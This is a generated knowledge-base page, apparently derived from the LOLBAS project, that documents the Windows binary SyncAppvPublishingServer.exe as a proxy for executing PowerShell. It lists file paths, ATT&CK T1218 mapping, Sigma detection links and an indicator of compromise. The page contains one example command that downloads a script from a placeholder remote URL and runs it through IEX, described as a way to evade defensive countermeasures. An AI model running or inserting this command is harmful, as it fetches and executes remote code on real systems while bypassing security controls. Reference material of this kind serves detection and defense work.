---
title: "SyncAppvPublishingServer.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Syncappvpublishingserver.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "SyncAppvPublishingServer.exe"
functions:
  - "Execute"
attack_technique_ids:
  - "T1218"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Used by App-v to get App-v server lists

## Paths

- `C:\Windows\System32\SyncAppvPublishingServer.exe`
- `C:\Windows\SysWOW64\SyncAppvPublishingServer.exe`

## Commands

### 1. Execute

Example command on how inject Powershell code into the process

```cmd
SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

- Use Case: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures
- Privileges: User
- Operating System: Windows 10 1709, Windows 10 1703, Windows 10 1607
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml
- IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed

## Resources

- {'Link': 'https://twitter.com/monoxgas/status/895045566090010624'}

## Acknowledgements

- {'Person': 'Nick Landers', 'Handle': '@monoxgas'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml)
